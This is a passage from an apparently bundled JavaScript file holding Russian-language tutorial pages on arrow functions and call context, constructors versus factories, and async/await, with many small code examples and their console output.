console.log(this.name)\n}\n\nhuman.getName()   // Stephan\nhuman.showName()  // Chrome\n~~~\n\nРазберемся детальнее, что происходит.\n\nПрежде, чем выполнить присваивание значения переменной **~human~**, движок должен вычислить значение выражения в правой части оператора присваивания.\nВ правой части находится литерал объекта.\n1. Движок вызывает конструктор **~Object~**.\n2. Конструктор **~Object~** создает пустой объект и возвращает ссылку на него.\n3. Движок, получив ссылку на объект, помещает эту ссылку в переменную **~human~** и выполняет три присваивания:\n\n~~~js\nhuman.name = 'Stephan'\nhuman.getName = function () {\n  console.log(this.name)\n}\nhuman.showName = () => console.log(this.name)\n~~~\n\nОтметим, что все три присваивания происходят в глобальной области видимости, т.е. в контексте глобального объекта **~window~**.\n\nИ вот тут мы видим, как работает передача контекста в процессе присваивания:\n\n![ico-20 pin] если в правой части оператора присваивания находится **обычная функция**, то она получает ссылку на контекст вызова, определяемую в **левой части** оператора присваивания (в нашем примере это объект **~human~**);\n![ico-20 pin] если в правой части оператора присваивания находится **стрелочная функция**, то она получает контекст \"**правой части**\", т.е. того объекта, в контексте которого происходит присваивание (в нашем примере это глобальный объект **~window~**).\n\nПо приколу я называю это \"правилом буравчика\" ![ico-25 smile]\n\n----------------\n#### ![ico-20 icon] Конструктор\n\nТеперь вспомним, как работает конструктор.\n\n~~~js\nfunction Sample (name) {\n  this.name = name\n  this.getName = function () {\n    console.log(this.name)\n  }\n  this.showName = () => console.log(this.name)\n}\n~~~\n\nКогда мы вызываем функцию **~Sample~** с ключевым словом **~new~**:\n\n~~~js\nconst user = new Sample('Piter')\n~~~\n\nто движок осуществляет следующую последовательность шагов:\n\n1. Вызывает конструктор **~Object~**.\n2. Конструктор **~Object~** создает пустой объект и возвращает ссылку на него.\n3. Движок помещает полученную ссылку в переменную **~user~**.\n~~~js\nconst user = new Object()\n~~~\n3. Движок добавляет в этот объект ссылку на свойство **~prototype~** функции **~Sample~**.\n~~~js\nObject.setPrototypeOf(user, Sample.prototype)\n~~~\n4. Движок вызывает функцию **~Sample~** в контексте объекта **~user~**.\n~~~js\nSample.call(user, 'Piter')\n~~~\n\nТ.е. к моменту, когда код функции **~Sample~** будет запущен на исполнение, контекст ее вызова будет создан (**~user~**), и это будет **экземпляр**.\nЧей экземпляр?\nДвижок уже добавил этому экземпляру ссылку на **~prototype~** функции **~Sample~**.\nА в объекте **~prototype~** функции есть свойство **~constructor~**, содержащее ссылку на эту функцию.\nТ.е. экземпляр уже имеет ссылку на конструктор **~Sample~**:\n\n~~~js\nconsole.log(user.__proto__.constructor.name)  // Sample\n~~~\nи теперь он распознается как экземпляр конструктора **~Sample~**:\n~~~js\nconsole.log(user instanceof Sample)  // true\n~~~\n\nЧто главное мы отсюда выносим:\n\nФункция **~Sample~** будет работать в контексте создаваемого экземпляра, т.е. в контексте объекта **~user~**.\n\nТогда присваивание:\n\n~~~js\nthis.showName = () => console.log(this.name)\n~~~\n\nбудет происходить в контексте экземпляра **~user~**.\nЭто означает, что стрелочная функция в правой части оператора присваивания получит контекст объекта **~user~**.\n\n__________________________________\n\n#### ![ico-20 icon] Фабрика\n\nТеперь посмотрим, что присходит в случае, когда вместо конструктора мы используем фабрику:\n~~~js\nconst template = {\n  name: 'Robert'\n}\n\nfunction fabric (instance, name) {\n  instance.name = name\n  instance.getName = function () {\n    console.log(this.name)\n  }\n  instance.showName = () => console.log(this.name)\n  return instance\n}\n\nconst user = fabric.call(template, {}, 'Piter')\n~~~\n\nФункция **~fabric~** вызывается в контексте объекта **~template~**.\n\nСогласно нашему \"правилу буравчика\" ![ico-20 smile], метод **~showName~** получит \"врожденный\" контекст вызова - ссылку на объект **~template~**.\n\nПроверим:\n\n~~~js\nuser.showName()  // Robert\n~~~\n____________________________________________________\n\n**Вывод**.\n\nВ случае, если экземпляр объекта создан с помощью конструктора,\nиспользование стрелочных функций в публичных методах объекта гарантирует,\nчто **~this~** будет всегда ссылаться на экземпляр.\n\nВ противном случае использование стрелочной функции создаст вам кучу проблем с контекстом вызова метода.\n\n_____________________________________________________\n\n## ![ico-20 icon] Примеры\n\n◘◘![ico-25 cap] ** 1**◘◘\n~~~js\nfunction Sample (name, age) {\n  const userName = name\n  const userAge = age\n  this.getName = this.createMethod(userName)\n  this.getAge = this.createMethod(userAge)\n}\n\nSample.prototype.createMethod = param => () => console.log(param)\n\nconst user = new Sample('Piter', 28)\n~~~\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst test = ((data = []) => arg => {\n  arg && data.push(arg)\n  return arg ? test :  data\n})()\n\ntest(1)\ntest(2)\ntest(3)\n\nconsole.log(test()) // [1, 2, 3]\n\ntest(4)(5)(7)(8)\n\nconsole.log(test()) // [1, 2, 3, 4, 5, 7, 8]\n~~~\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nconst getUser = (getName = prompt.bind(null, 'User name'), getAge = prompt.bind(null, 'User age')) => ({\n  name: getName(),\n  age: getAge()\n})\n~~~\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\n(func => Object.assign({\n  name: func('Your name'),\n  hobby: func('Your hobby')\n}))(message => prompt(message))\n~~~\n\n____________________________________________________________________\n\n[![ico-30 hw] Тесты](quiz/arrowFunctions)\n"},27331:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] async | await\n\n**ECMAScript 2017**\n\n________________________________________________________________________________________________\n\n[►►►**Конструктор AsyncFunction**►►►](page/async-constructor)\n\n________________________________________________________________________________________________\n\nДва коротких слова, фантастически изменившие нашу реальность.\nДва слова, которые запускают мощный механизм управления стихией событий.\nСлова, полностью освободившие нас из рабства событий, позволившие нам \"оседлать\" дикого скакуна асинхронщины.\nКороче, магия продолжается... промисы были только началом.\n\n## ![ico-25 icon] async function\n\nДля объявления асинхронной функции используется ключевое слово **~async~** перед ключевым словом **_function_**:\n\n~~~js\nasync function sigma () {\n  ...\n}\n~~~\n\nДля стрелочных функций:\n\n~~~js\nconst sayHello = async () => 'Hello'\n~~~\n\nЧто это меняет в нашей жизни?\n\n![ico-25 warn] **Вызов асинхронной функции возвращает промис**.\n\nПоэтому асинхронная функция является более лаконичным способом создавать промисы, чем конструктор **~Promise~**.\n\nТеперь вместо того, чтобы создавать промис традиционным образом (с помощью конструктора):\n\n~~~js\nconst createPromise = message => new Promise(resolve => resolve(message))\n~~~\n\nмы можем сделать свой код значительно короче и читабельнее:\n\n~~~js\nconst createPromise = async message => message\n~~~\n\nФункция **~createPromise~** и в первом, и во втором варианте создает промис, однако во втором варианте мы обходимся без явного вызова конструктора **~Promise~**.\n\nЧем резолвится промис, возвращаемый асинхронной функцией?\n\n~~~js\ncreatePromise('Promise is microtask')\n  .then(response => console.log(response))\n~~~\n\n![ico-20 warn] Тем, что возвращает асинхронная функция с помощью оператора **~return~**.\n^^Если в асинхронной функции нет оператора ~return~, то возвращаемый ею промис будет резолвиться значением ~undefined~.^^\n\n______________________________________________\n\nВ следующих примерах мы будем асинхронно по точкам строить графики функций.\nПоскольку мы будем выводить графики функций на страницу, нужно определиться, в каком именно контейнере будут эти графики.\n\n~~~js\nconst section = document.body\nsection.style = 'padding: 120px;'\n~~~\n\nТакже создадим вспомогательную функцию **~createPoint~**:\n\n~~~js\nfunction createPoint (x, y, color = '#f50') {\n  const point = section\n    .appendChild(document.createElement('span'))\n  point.innerText = '•'\n  point.style = `\n    position: relative;\n    left: ${x.toFixed(2)}px;\n    top: ${y.toFixed(2)}px;\n    color: ${color};\n  `\n}\n~~~\n\nи еще две вспомогательные функции **~sin~** и **~cos~**:\n\n~~~js\nconst step = Math.PI / 10\n\nconst sin = num => createPoint(num * step * 30, Math.sin(num * step) * 100, '#09b')\nconst cos = num => createPoint(num * step * 30, Math.cos(num * step) * 100)\n~~~\n\nОбратите внимание, что до сих пор мы не использовали асинхронную функцию.\n\nА вот теперь она появится:\n\n◘◘![ico-25 cap] ** 1**◘◘\n~~~js\nconst recurse = (times => {\n  let counter = 0\n  let promise = (async () => sin(0))().then(cos(0))\n  return function () {\n    promise = promise\n      .then(sin.bind(null, counter))\n      .then(cos.bind(null, counter))\n    counter++ < times && recurse()\n  }\n})(20)\n\nrecurse()\n~~~\n\n{{{async-await-01.js}}}\n\nЗдесь мы видим анонимную асинхронную функцию **~async () => sin()~**.\nМы уже знаем, что она возвращает **~promise~**.\n\n^^^[![ico-30 eyes]]\n\n^^Конечно, для демонстрации цепочных вычислений мы могли записать и так:^^\n\n~~~js\nconst start = () => (async () => sin())().then(cos)\n\nstart()\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n~~~\n\n^^однако использование рекурсивной функции делает код намного более коротким, хотя и не таким наглядным.^^\n\n^^^\n\nВ этом примере мы воспользовались тем,\nчто не только асинхронная функция, но и метод **~then~** возвращает **~promise~**.\n\nБлагодаря этому каждая точка каждого графика строится колбеком промиса (микротаском), т.е. страница не теряет интерактивность на время построения графиков.\n\n_________________________________________\n\nА теперь покажем более наглядно, как микротаски пропускают друг друга по очереди в стек вызовов, от чего складывается впечатление, что графики функций отрисовываются одновременно, хотя на самом деле сначала отрисовывается одна точка графика функции синус, за ней - одна точка графика косинуса, потом опять одна точка синуса, и т.д.\n\nДля того, чтобы сделать процесс более наглядным, воспользуемся методом глобального объекта **~requestAnimationFrame~**.\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst recurseSin = (times => {\n  let counter = 0\n  let promise = (async () => sin(0))()\n  return function () {\n    promise = promise.then(sin.bind(null, counter))\n    counter++ < times && requestAnimationFrame(recurseSin)\n  }\n})(20)\n\nconst recurseCos = (times => {\n  let counter = 0\n  let promise = (async () => cos(0))()\n  return function () {\n    promise = promise.then(cos.bind(null, counter))\n    counter++ < times && requestAnimationFrame(recurseCos)\n  }\n})(20)\n\nrecurseSin()\nrecurseCos()\n~~~\n\n{{{async-await-02.js}}}\n\n________________________\n\nДля пущей убедительности добавим еще анимированную фигуру:\n\n~~~js\nconst start = Date.now()\n\nfunction createFigure () {\n  const figure = section\n    .appendChild(document.createElement('div'))\n  return Object.assign(figure, {\n    style: `\n      position: absolute;\n      top: 108px;\n      left: 48px;\n      width: 100px;\n      height: 100px;\n      border-radius: 4px;\n      background: #fa0;\n    `,\n    move () {\n      const { left } = figure.style\n      Object.assign(figure.style, {\n        left: parseInt(left) + 2 + 'px'\n      })\n      Date.now() - start < 5000 && requestAnimationFrame(figure.move)\n    }\n  })\n}\n~~~\n\nи убедимся, что в нашем примере отрисовка графиков функций не блокирует анимацию фигуры:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nrecurseSin()\nrecurseCos()\nconst figure = createFigure()\nfigure.move()\n~~~\n\n{{{async-await-03.js}}}\n\nВаши алодисменты, господа! Асинхронная функция их точно заслужила.\nИ это только начало.\n\n________________________________________________________________________________________________\n\n## ![ico-25 icon] await\n\n![ico-20 warn] Ключевое слово  **~await~**  можно использовать только внутри **асинхронных функций**.\n\n^^В противном случае будет сгенерировано исключение:^^\n\n~~~error\n    Uncaught SyntaxError: await is only valid in async function\n~~~\n\nДавайте разберемся, что делает движок, когда встречает ключевое слово **~await~**.\nВо-первых, за ключевым словом **~await~** всегда следует какое-то выражение.\nМы знаем, что когда движок встречает в нашем коде выражение, он вычисляет значение этого выражения, и заменяет это выражение на вычисленное значение.\nИтак, разберемся, что может следовать за ключевым словом **~await~**, и как будет вести себя движок в каждом случае.\n\nМы рассмотрим варианты, когда за ключевым словом **~await~** следует:\n1.  промис - наша \"магическая коробка с двумя дырками\";\n2. объект, имеющий метод **~then~**;\n3. любое выражение, значением которого будет ссылка на массив или объект, строка, или число, или логическое значение, а так же ~null~ и ~undefined~.\n\nПочему мы отдельно рассматриваем эти варианты?\nПотому что поведение движка будет различным в каждом из этих случаев.\n\n_____________________________________\n\n### ![ico-20 icon] await &lt;promise>\n\nПервым делом посмотрим, что произойдет, если после ключевого слова **~await~** находится ссылка на нашу \"магическую коробку с двумя дырками\".\n\nСоздадим две вспомогательные функции:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nconst random = num => Math.round(Math.random() * num)\n\nconst func = (message, resolve) => setTimeout(() => resolve(message), random(5000))\n\nconst createPromise = message => new Promise(func.bind(null, message))\n~~~\n\nИтак, мы можем создать \"магическую коробку с двумя дырками\" методом **~createPromise~**.\nЗатем мы можем использовать метод **~then()~** этой \"коробки\" (промиса) для передачи колбека (функции обратного вызова), который \"заберет\" результат, которым резолвится промис.\n\n~~~js\ncreatePromise('Resolved!').then(console.log)\n~~~\n~~~console\nResolved!\n~~~\n\nА теперь посмотрим, как можно использовать ключевое слово **~await~**, и чем отличается его работа от работы метода **~then()~** промиса.\n\n~~~js\nconst asyncFunc = async () => console.log(await createPromise('Resolved!'))\n\nasyncFunc()\n~~~\n\n~~~console\nResolved!\n~~~\n\nИли так:\n\n~~~js\n(async () => console.log(await createPromise('Resolved!')))()\n~~~\n\n~~~console\nResolved!\n~~~\n\nПока никаких отличий не наблюдается.\nТ.е. ключевое слово **~await~** вызывает метод **~then()~** промиса, который стоит после **~await~**.\nНо возникает вопрос: метод **~then()~** промиса должен получить в качестве аргумента ссылку на колбек-функции.\nОднако выражение:\n~~~js\nawait createPromise('Resolved!')\n~~~\nникакой колбек-функции не содержит. Даже намека.\nДавайте разберемся, что же там происходит.\n\n~~~js\nnew Promise((resolve, reject) => {\n  console.log('resolve:\\n', resolve)\n  console.log('reject:\\n', reject)\n})\n~~~\n\n~~~console\nresolve:\n ƒ () { [native code] }\nreject:\n ƒ () { [native code] }\n~~~\n\nПри вызове конструктора **~Promise~** ему была передана функция с двумя формальными параметрами.\nОна была вызвана, и получила при вызове в качестве аргументов два колбека.\nКак мы видим, это некие дефолтные колбеки.\nОни \"забирают\" результат и помещают его в нашу \"магическую коробку с двумя дырками\".\n\nПоэтому логично предположить, что эти колбеки имеют такой код:\n\n~~~js\nresult => result\n~~~\n\nПосмотрим, что делает **~await~**:\n◘◘resolve◘◘\n~~~js\nconst test = async () => console.log('Result: ', await Promise.resolve('Success.'))\ntest()\n~~~\n\n~~~console\nResult:  Success.\n~~~\n\n◘◘reject◘◘\n~~~js\nconst test = async () => console.log('Result: ', await Promise.reject('Failure.'))\ntest()\n~~~\n\n~~~error\n    Uncaught (in promise) Failure.\n~~~\n\nСравним это поведение с явным вызовом метода **~then~** промиса с передачей ему двух колбеков:\n\n~~~js\nPromise.reject('Failure.')\n  .then(console.log, console.warn)\n~~~\n\n~~~warn\n    Failure.\n~~~\n\nКак видите, **~await~** вызывает метод **~then~**, но передает ему только один колбек (**~resolve~**).\nВ случае реджекта управление будет \"перехвачено\" движком, который выбросит в консоль исключение.\n\nПоэтому для \"перехвата\" исключений стоит использовать метод **~catch~**:\n\n~~~js\nconst test = async () => {\n  const result = await Promise.reject('Failure.')\n    .catch(console.warn)\n  result && console.log('Result: ', result)\n}\ntest()\n~~~\n\n~~~warn\n    Failure.\n~~~\n_____________________________________________\n\nПусть у нас есть такая функция:\n\n~~~js\nconst func = (resolve, reject) => Math.random() > 0.5 ? resolve('Success.') : reject('Failure.')\n~~~\n\nЕсли мы воспользуемся методом **~then~** промиса для передачи второго колбека **~reject~**:\n\n◘◘**^^Promise^^**◘◘\n\n~~~js\nnew Promise(func)\n  .then(console.log, console.warn)\n~~~\n\nто исключение будет \"перехвачено\", и в консоли будет предупреждение.\n\nЕсли же мы воспользуемся ключевым словом **~await~**:\n\n◘◘**^^async function^^**◘◘\n\n~~~js\nasync function test () {\n  console.log(await new Promise(func))\n}\n~~~\n\nТогда в случае \"отказа\" промиса будет сгенерировано исключение:\n\n~~~error\n    Uncaught (in promise) Failure.\n~~~\n\nТаким образом, если за ключевым словом **~await~** следует промис, то движок вызовет метод **~then~** этого промиса, но ![ico-20 warn] без передачи второго колбека (**~reject~**).\n\n~~~js\nnew Promise(func).then(console.log)\n~~~\n\n________________________________________\n\nА если после ключевого слова **~await~** будет не промис, а любой другой объект?\nИли даже не объект, а какая-то строка, или число, или логическое значение?\n\n_____________________________________\n\n### ![ico-20 icon] Объект с методом then\n\nДавайте создадим объект, у которого есть метод **~then()~**:\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst user = {\n  name: 'Polina',\n  then (callback) {\n    callback(this.name)\n  }\n}\n\nuser.then(console.log)\nconsole.log('finish')\n~~~\n~~~console\nPolina\nfinish\n~~~\n\nОчевидно, что объект **~user~** **не** является промисом, и никакой асинхронщины пока не наблюдается.\n\nОднако посмотрим, что произойдет при выполнении кода:\n\n~~~js\nconst test = async () => console.log(await user)\ntest()\nconsole.log('finish')\n~~~\n~~~console\nfinish\nPolina\n~~~\n\nКак видим, движок, обнаружив ключевое слово **~await~**, не сильно напрягался с тем, что за выражение следует за ним, и его ничуть не смутило то, что это не промис.\nДвижок обнаружил, что это объект, у которого есть метод **~then()~**.\n\nИ что мы видим? Метод **~then()~** объекта **~user~** был вызван!\n\nНо тут есть одна загадка:\nМетод **~then()~** объекта **~user~** является функцией высшего порядка,\nт.е. он ожидает при вызове получить один обязательный аргумент - **функцию**.\nНо мы не передавали никакого аргумента методу **~then()~** объекта **~user~**.\nБолее того, мы его вообще не вызывали!\n\nПолучается, что движок не только сам вызвал метод **~then()~** объекта **~user~**,\nно еще и передал ему некую функцию в качестве аргумента.\n\nВопрос: какой колбек передал движок методу **~then()~** объекта **~user~**?\n\nСудя по поведению метода **~then()~**, он получил вот такой колбек:\n\n~~~js\nresponse => response\n~~~\n\nт.е. колбек, действующий по принципу: \"Что получил - то и отдаю\".\n\nКак видите, встретив одно маленькое слово **~await~**, движок развивает довольно бурную деятельность.\n\nПоследний \"штрих\": в предыдущем примере метод **~then~** объекта **~user~** был функцией высшего порядка, т.е принимал в качестве аргумента функцию.\nДавайте посмотрим, что произойдет, если метод **~then~** будет обычной функцией:\n\n~~~js\nconst user = {\n  name: 'Polina',\n  then () {\n    console.log(this.name)\n  }\n}\n\n;(async () => {\n  await user\n  console.log('Hi from Event Loop')\n})()\n\nconsole.log('finish')\n~~~\n\n~~~console\nfinish\nPolina\n~~~\n\nКак видите, строка\n\n~~~js\nconsole.log('Hi from Event Loop')\n~~~\n\nтак и не была выполнена.\nЭто означает, что асинхронная функция так и не дождалась возвращения колбека (потому, что его не было), и не смогла возобновить свое выполнение после **~await~**.\nТ.е асинхронная функция могла вернуться из цикла событий только после возвращения оттуда колбека, отправленного туда методом **~then~**.\nНо метод **~then~** не отправил ничего в цикл событий.\nБудьте внимательны!\n\n_____________________________________\n\n### ![ico-20 icon] Вспомним обещания\n\nМы с вами уже говорили, что экземпляр конструктора **~Promise~** - это магическая коробка с двумя дырками.\nМетоды **~then()~** и **~catch()~** - это и есть \"дырки\" в коробке.\nЧерез эти \"дырки\" мы всовываем свои колбеки, и коробка \"обещает\" нам, что как только в ней появится содержимое, то один из наших колбеков его получит.\n\n@@@@ 2\nКогда в коробке появится содержимое - неизвестно.<br>Каким будет это содержимое - \"белым шаром\" (**response**) или \"черным шаром\" (**error**) - тоже неизвестно.\n![](illustrations/white-and-black.png)\n@@@@\n\n~~~~js\nconst getStatus = async () => Math.random() > .5 ? 'white' : 'black'\n\nconst func = ((startTime, callback) => {\n  const time = Math.round(Math.random() * 30000)\n  return async timeStamp => {\n    const interval = timeStamp - startTime\n    if (interval < time) requestAnimationFrame(func)\n    else callback(await getStatus())\n  }\n})(0, console.log)\n\nrequestAnimationFrame(func)\n~~~~\n\nНадо отметить, что коробка промиса знает, что ей нужно \"поймать\" белый или черный шар, когда он прилетит.\n\nИ магическая коробка отправляет свои собственные колбеки за белым и черным шаром в **Event Loop**.\n\nКолбеки уже \"сидят\" в таблице эвентов \"в засаде\".\nОни \"ловят шары\" за нас.\nКогда поймают, то положат в магическую коробку экземпляра **~Promise~**.\nОни привязаны, соответственно, к таким событиям:\n\n1. \"Прилетел белый шар\" (response)\n\n2. \"Прилетел черный шар\" (error)\n\nНазад из **Event Loop** вернется только один из них.\nВ коробке экземпляра **~Promise~** появится содержимое.\n\n{{{async-await-05.js}}}\n\nТеперь магическая коробка с двумя дырками ждет, когда вы всунете в эти дырки свои \"руки\" (колбеки **~resolve~** и **~reject~**), которым можно будет отдать прилетевший шар.\n\nВозможно, что вы уже \"всунули руки\" раньше, тогда вы получите шар, как только он появится в коробке экземпляра **~Promise~**.\nВ противном случае шар будет лежать в коробке, пока вы не воспользуетесь методами **~then()~** и **~catch()~**, т.е. пока вы не \"всунете руки\", чтобы забрать шар.\n\n![ico-30 point_up] Отсюда вытекает, что магическая коробка синхронизирует два автономных асинхронных процесса.\nВ этом и заключается магическая сила коробки с двумя дырками.\n\nТ.е. магическая коробка промиса посылает \"сбегать за шариком\" свои собственные колбеки, а потом ждет, когда вы всунете руки (колбеки) в дырки **~then()~** и **~catch()~**, чтобы отдать находящийся на хранении шарик.\n\n^^Причем в одну дырку **~then()~** вы можете всунуть обе руки (**~resolve~** и **~reject~**), хотя использование второй дырки **~catch()~** в некоторых случаях избавляет вас от сообщений об ошибке в консоли. Старайтесь не заставлять консоль краснеть за вас ![ico-20 smile].^^\n\n_________________________________________\n\n### ![ico-20 icon] await &lt;expression>\n\nИтак, движок сталкивается с выражением ~**await** &lt;expression>~.\nЕму нужно вычислить значение этого выражения.\n![ico-25 warn] Пока он его не вычислит и не заменит выражение ~await &lt;expression>~ на полученное (вычисленное) значение, он не сдвинется к следующей строчке кода асинхронной функции.\n\nЕсли значением ~<expression>~ будет ссылка на экземпляр **~Promise~**, то движок вызовет метод **~then()~** этого экземпляра, передаст ему колбек:\n\n~~~js\nresponse => response\n~~~\nи приостановит выполнение кода асинхронной функции до тех пор, пока колбек не вернется из **Event Loop** с \"шариком\" результата (~response~) и не положит его в коробку промиса.\n\nПосле того, как результат появится в коробке, движок вытащит его из коробки и вставит на место выражения ~await &lt;expression>~.\n\nМы уже задались вопросом, что будет делать движок, если ~&lt;expression>~ не будет промисом.\nИ мы уже разобрались, что будет делать движок, если ~&lt;expression>~ будет объектом, у которого есть метод **~then()~**.\n\nТеперь посмотрим, что будет делать движок, если ~&lt;expression>~ будет строкой, или числом, или другим значением.\n\n◘◘![ico-25 cap] ** 6**◘◘\n~~~js\nconsole.log('Start')\n;(async function () {\n  console.log('Async function starts')\n  console.log(await 'Hello!')\n  console.log('Async function finished')\n})()\nconsole.log('Finish')\n~~~\n\nВ этом примере нужно внимательно следить за последовательностью вывода сообщений в консоль:\n\n~~~console\nStart\nAsync function starts\nFinish\nHello!\nAsync function finished\nundefined\n~~~\n\nВсе, что выведено в консоль после сообщения **_Finish_** - это функции обратного вызова, которые \"прошли\" через **Event Loop**.\nЕсли они выведены до ~undefined~ - это **микротаски**.\n\nИтак, движок благополучно выводил в консоль ^^**_Start_**^^, затем наткнулся на функциональное выражение ([IIFE](page/Closure#IIFE)) и начал \"вычислять\" значение выражения в круглых скобках. А в круглых скобках - объявление анонимной асинхронной функции. Движок передает управление конструктору, который создает эту функцию и возвращает ссылку на нее. Движок, получив ссылку на функцию, вызывает ее, поскольку далее следуют курглые скобки (вызов функции).\nАнонимная асинхронная функция начинает выполняться, и в консоль выводится сообщение ^^**_Async function starts_**^^.\nОднако уже в следующей строчке кода функции движок \"наткнулся\" на выражение:\n~~~js\nconsole.log(await 'Hello!')\n~~~\nЗдесь движок понимает, что нужно послать колбек ~() => 'Hello!'~ в **Event Loop**, и функция должна дождаться его возвращения, чтобы завершить выполнение этой строчки кода. Далее код функции выполняться не может, пока не вернется колбек. А вернуться он может только тогда, когда стек вызовов будет свободен.\nИтак, движку нужно на время \"избавиться\" от этой функции, но так, чтобы после возвращения колбека ~() => 'Hello!'~ можно было возобновить ее выполнение.\nКак это можно сделать?\n\nНапример, заменив оставшийся невыполненым код функции:\n\n~~~js\nconsole.log(await 'Hello!')\nconsole.log('Async function finished')\n~~~\n\nна вот такой код:\n\n~~~js\nPromise.resolve('Hello!')\n  .then(message => {\n    console.log(message)\n    console.log('Async function finished')\n  })\n~~~\n\nИ далее движок продолжает выполнять код скрипта со строчки:\n\n~~~js\nconsole.log('Finish')\n~~~\n\nпосле чего стек вызовов освобождается, и из **Event Loop** возвращается колбек:\n\n~~~js\nmessage => {\n  console.log(message)\n  console.log('Async function finished')\n}\n~~~\n\nкоторый получил message со значением 'Hello!'.\n\nТаким образом, появление ключевого слова **~await~** приводит к тому, что невыполненный остаток кода асинхронной функции становится колбеком.\n\n_____________________________________________\n\n## ![ico-20 icon] Примеры\n\n### ![ico-25 cap] 7\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nconsole.log('Start')\n\n;(async function test (callback) {\n  const inputs = []\n  inputs.push(await 5)\n  inputs.push(await 7)\n  inputs.push(await 9)\n  const result = inputs\n    .reduce((res, num) => res += num)\n  callback(await result)\n})(console.log)\n\nconsole.log('Finish')\n~~~\n\nВ этом примере мы специально дали имя **~test~** функции, чтобы отслеживать ее появление в стеке вызовов.\n\n![](illustrations/async-await-7.gif)\n\n__________________________________________________________________________\n\n### ![ico-25 cap] 8\n\nВ этом примере код основного потока отработает при значении ** 5** переменной ~num~.\nОднако вызов асинхронной функции ~sample()~ приведет к тому, что после завершения работы кода основного потока значение переменной ~num~ будет уже 10.\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nlet num = 5\n\nasync function sample (arg) {\n  num = await arg\n}\n\nsample(10)\n  .then(() => console.log(`Finish value: ${num}`))\n\nconsole.log('Start value: ', num)\n~~~\n\n••Start value:  5••\n••Finish value: 10••\n\n_________________________________\n\n### ![ico-25 cap] 9\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nasync function getUser (userNum) {\n  return (await (await fetch(`https://api.github.com/users/${userNum}`)).json()).name\n}\n\ngetUser(5)\n  .then(console.log)\n~~~\n\n**Output**:\n\n••Yuriy Semchyshyn••\n\n_____________________________________\n\n### ![ico-25 cap] 10\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\nconst browsers = ['Chrome', 'Mozilla', 'Safari', 'IE']\n\nbrowsers.then = (function () {\n  let current = 0\n\n  return function (resolve) {\n    const response = {\n      value: this[current++],\n      done: current > this.length\n    }\n\n    setTimeout(() => resolve.call(null, response), 1000)\n  }\n})()\n\nasync function showBrowsers () {\n  do {\n    var { done, value } = await browsers\n\n    console.log(`{ value: ${value}, done: ${done} }`)\n  } while (!done)\n}\n\nshowBrowsers ()\n~~~\n\n{{{async-await-6.js}}}\n\n____________________________________________________________\n\n### ![ico-25 cap] 11\n\n◘◘![ico-25 cap] **11**◘◘\n\n~~~js\n(function demo (maxValue) {\n  const placeholder = document.body\n    .appendChild(document.createElement('h3'))\n\n  while (maxValue--) {\n    const number = maxValue\n    setTimeout(async () => Object.assign(placeholder, {\n      innerText: await number\n    }), number * 1000)\n  }\n})(10)\n~~~\n\n{{{async-await-11.js}}}\n\n____________________________________________________________\n\n### ![ico-25 cap] 12\n\n◘◘![ico-25 cap] **12**◘◘\n\n~~~js\n;(async () => await 'async-await')().then(console.log)\n\nPromise.resolve('promise').then(console.log)\n\n;(async () => 'async')().then(console.log)\n~~~\n\n~~~console\npromise\nasync\nasync-await\n~~~\n\nЗаметим, что:\n\n1. Промис, возвращенный функцией ~async () => await 'async-await'~, разрезолвился последним, хотя это первая строчка кода.\n2. Первым разрезолвился ~Promise.resolve('promise')~ (вторая строчка кода).\n3. Вторым разрезолвился промис, возвращенный функцией ~async () => 'async'~ (третья строчка кода).\n\nСделав \"рокировку\" второй и третьей строчек кода:\n\n~~~js\n;(async () => await 'async-await')().then(console.log)\n\n;(async () => 'async')().then(console.log)\n\nPromise.resolve('promise').then(console.log)\n~~~\n\nмы увидим, что порядок вывода в консоль изменился соответствующим образом:\n\n~~~console\nasync\npromise\nasync-await\n~~~\n\nто есть их колбеки попадают в очередь микротасков в той же последовательности, в какой они появились в коде.\n\nА вот с функцией ~async () => await 'async-await'~ все иначе.\n\nПокажем, что код:\n\n~~~js\n;(async () => await 'async-await-1')().then(console.log)\n~~~\n\nработает идентично коду:\n\n~~~js\nnew Promise(resolve => resolve('async-await-2'))\n  .then(response => response)\n  .then(console.log)\n~~~\n\nДля этого запустим их сначала в такой последовательности:\n\n~~~js\n;(async () => await 'async-await-1')().then(console.log)\n\nnew Promise(resolve => resolve('async-await-2'))\n  .then(response => response)\n  .then(console.log)\n~~~\n\n~~~console\nasync-await-1\nasync-await-2\n~~~\n\nа затем поменяем порядок их следования:\n\n~~~js\nnew Promise(resolve => resolve('async-await-2'))\n  .then(response => response)\n  .then(console.log)\n\n;(async () => await 'async-await-1')().then(console.log)\n~~~\n\n~~~console\nasync-await-2\nasync-await-1\n~~~\n\nКак мы видим, они резолвятся строго в порядке их следования в коде.\nТ.е. появление ключевого слова **~await~** удлиняет цепочку проходящих через **Event Loop** колбеков на 1, что и приводит к тому, что в примере 12 последним \"приходит к финишу\" ~;(async () => await 'async-await')().then(console.log)~.\n\nКак мы уже говорили ранее, сама асинхронная функция прерывается в точке, где встречается **~await~**, и остаток кода этой функции, который не был выполнен до этого, сам становится колбеком и \"уходит\" в **Event Loop**, чтобы освободить стек вызовов и дать возможность колбеку вернуться с результатом. Поэтому цепочка удлиняется на 1 микротаск.\n\n______________________________________________\n\n### ![ico-25 cap] 13\n\n◘◘![ico-25 cap] **13**◘◘\n\n~~~js\nconst promise = message => new Promise(resolve => {\n  const time 